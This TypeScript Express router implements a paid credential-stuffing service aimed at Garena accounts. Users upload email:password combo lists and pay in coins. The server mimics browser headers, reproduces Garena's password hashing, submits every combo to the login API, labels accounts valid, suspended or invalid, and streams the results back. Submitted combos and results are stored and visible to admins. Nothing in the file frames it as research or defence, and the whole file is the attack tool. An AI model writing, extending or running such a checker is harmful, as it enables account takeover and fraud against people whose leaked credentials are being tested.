import { Router, type IRouter, type Request } from "express";
import { requireAuth } from "../middlewares/auth";
import { db, usersTable, transactionsTable } from "@workspace/db";
import { eq } from "drizzle-orm";
import { pool } from "@workspace/db";
import crypto from "node:crypto";

const router: IRouter = Router();
type UserRequest = Request & { user: typeof usersTable.$inferSelect };

function getLineCost(lines: number): number {
  if (lines <= 200) return 20;
  if (lines <= 500) return 50;
  if (lines <= 1000) return 100;
  return 100;
}

function encode(plaintext: string, key: string): string {
  const keyBuf = Buffer.from(key, "hex");
  const plainBuf = Buffer.from(plaintext, "hex");
  const cipher = crypto.createCipheriv("aes-128-ecb", keyBuf, null);
  cipher.setAutoPadding(false);
  return Buffer.concat([cipher.update(plainBuf), cipher.final()]).toString("hex").slice(0, 32);
}

function getPassMd5(password: string): string {
  return crypto.createHash("md5").update(decodeURIComponent(password), "utf8").digest("hex");
}

function hashPassword(password: string, v1: string, v2: string): string {
  const passmd5 = getPassMd5(password);
  const inner = crypto.createHash("sha256").update(passmd5 + v1).digest("hex");
  const outer = crypto.createHash("sha256").update(inner + v2).digest("hex");
  return encode(passmd5, outer);
}

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

interface CheckResult {
  combo: string;
  email: string;
  status: "valid" | "invalid" | "error";
  details?: string;
}

async function checkGarenaAccount(email: string, password: string): Promise<CheckResult> {
  const combo = `${email}:${password}`;
  try {
    const headers = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
      "Accept": "application/json, text/javascript, */*; q=0.01",
      "Accept-Language": "en-US,en;q=0.9",
      "Referer": "https://account.garena.com/",
      "Origin": "https://account.garena.com",
      "X-Requested-With": "XMLHttpRequest",
      "Content-Type": "application/x-www-form-urlencoded",
    };

    const initRes = await fetch("https://passport.garena.com/api/login", {
      method: "GET",
      headers,
      signal: AbortSignal.timeout(10000),
    });

    const cookies: Record<string, string> = {};
    const setCookie = initRes.headers.get("set-cookie") ?? "";
    const cookieParts = setCookie.split(",").map((c) => c.trim());
    for (const part of cookieParts) {
      const seg = part.split(";")[0];
      const eqIdx = seg.indexOf("=");
      if (eqIdx > 0) {
        const k = seg.slice(0, eqIdx).trim();
        const v = seg.slice(eqIdx + 1).trim();
        if (k && v) cookies[k] = v;
      }
    }

    const v1 = cookies["garena_id"] ?? cookies["_ga"] ?? "";
    const v2 = cookies["garena_sn"] ?? cookies["session_key"] ?? "";
    const hashed = hashPassword(password, v1, v2);
    const cookieStr = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join("; ");

    const loginRes = await fetch("https://passport.garena.com/api/login", {
      method: "POST",
      headers: { ...headers, Cookie: cookieStr },
      body: new URLSearchParams({ account: email, password: hashed, captcha: "" }),
      signal: AbortSignal.timeout(10000),
    });

    const loginData = await loginRes.json() as {
      success?: boolean;
      error?: string;
      error_code?: number;
      token?: string;
    };

    if (loginRes.status === 200 && (loginData.success || loginData.token)) {
      return { combo, email, status: "valid", details: "Account valid" };
    }

    const errCode = loginData.error_code;
    if (errCode === 105 || loginData.error === "invalid_account") {
      return { combo, email, status: "invalid", details: "Wrong credentials" };
    }
    if (errCode === 106) {
      return { combo, email, status: "valid", details: "Account suspended" };
    }
    if (errCode === 107) {
      return { combo, email, status: "invalid", details: "Account banned" };
    }

    return { combo, email, status: "invalid", details: loginData.error ?? `Code ${loginRes.status}` };
  } catch {
    return { combo, email, status: "error", details: "Timeout" };
  }
}

router.post("/checker/scan", requireAuth, async (req: Request, res): Promise<void> => {
  const user = (req as UserRequest).user;
  const { filename, content } = req.body as { filename?: string; content?: string };

  if (!content?.trim()) {
    res.status(400).json({ error: "File content is required." });
    return;
  }

  const lines = content
    .split("\n")
    .map((l) => l.trim())
    .filter((l) => l.length > 0 && l.includes(":"));

  if (lines.length === 0) {
    res.status(400).json({ error: "No valid combo lines found (format: email:password)." });
    return;
  }

  if (lines.length > 1000) {
    res.status(400).json({ error: "Maximum 1000 lines per scan." });
    return;
  }

  const cost = getLineCost(lines.length);
  if (user.balance < cost) {
    res.status(402).json({ error: `Need ${cost} coins for ${lines.length} lines. You have ${user.balance}.` });
    return;
  }

  await db.update(usersTable).set({ balance: user.balance - cost }).where(eq(usersTable.id, user.id));
  await db.insert(transactionsTable).values({
    userId: user.id,
    type: "spend",
    amount: cost,
    status: "approved",
    note: `Checker scan: ${lines.length} lines (${filename ?? "upload"})`,
  });

  const client = await pool.connect();
  let jobId: number;
  try {
    const jobRes = await client.query<{ id: number }>(
      `INSERT INTO checker_jobs (user_id, filename, file_content, total_lines, coins_spent, status)
       VALUES ($1, $2, $3, $4, $5, 'running') RETURNING id`,
      [user.id, filename ?? "upload.txt", content, lines.length, cost]
    );
    jobId = jobRes.rows[0].id;
  } finally {
    client.release();
  }

  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders();

  const sse = (data: object) => {
    if (!res.writableEnded) res.write(`data: ${JSON.stringify(data)}\n\n`);
  };

  const results: CheckResult[] = [];
  let valid = 0;
  let invalid = 0;
  let errors = 0;

  sse({ type: "start", total: lines.length, coinsSpent: cost, remainingBalance: user.balance - cost, jobId });

  for (let i = 0; i < lines.length; i++) {
    if (res.writableEnded) break;
    const line = lines[i];
    const colonIdx = line.indexOf(":");
    const email = line.slice(0, colonIdx).trim();
    const password = line.slice(colonIdx + 1).trim();

    const result = await checkGarenaAccount(email, password);
    results.push(result);

    if (result.status === "valid") valid++;
    else if (result.status === "invalid") invalid++;
    else errors++;

    sse({
      type: "result",
      index: i + 1,
      total: lines.length,
      combo: result.combo,
      status: result.status,
      details: result.details,
      progress: Math.round(((i + 1) / lines.length) * 100),
      valid,
      invalid,
      errors,
    });

    if (i < lines.length - 1) await sleep(300);
  }

  const client2 = await pool.connect();
  try {
    await client2.query(
      `UPDATE checker_jobs SET status = 'done', results = $1::jsonb WHERE id = $2`,
      [JSON.stringify(results), jobId]
    );
  } finally {
    client2.release();
  }

  sse({ type: "done", valid, invalid, errors, total: lines.length, jobId });
  res.end();
});

router.get("/checker/jobs", requireAuth, async (req: Request, res): Promise<void> => {
  const user = (req as UserRequest).user;
  const client = await pool.connect();
  try {
    const rows = await client.query(
      `SELECT id, filename, total_lines, coins_spent, status, results, created_at
       FROM checker_jobs WHERE user_id = $1 ORDER BY created_at DESC LIMIT 20`,
      [user.id]
    );
    res.json(rows.rows);
  } finally {
    client.release();
  }
});

router.get("/admin/checker-jobs", requireAuth, async (req: Request, res): Promise<void> => {
  const user = (req as UserRequest).user;
  if (!user.isAdmin) { res.status(403).json({ error: "Forbidden" }); return; }
  const client = await pool.connect();
  try {
    const rows = await client.query(
      `SELECT cj.id, cj.filename, cj.total_lines, cj.coins_spent, cj.status, cj.results, cj.created_at,
              u.username, u.user_id as user_uid
       FROM checker_jobs cj JOIN users u ON u.id = cj.user_id
       ORDER BY cj.created_at DESC LIMIT 50`
    );
    res.json(rows.rows);
  } finally {
    client.release();
  }
});

export default router;
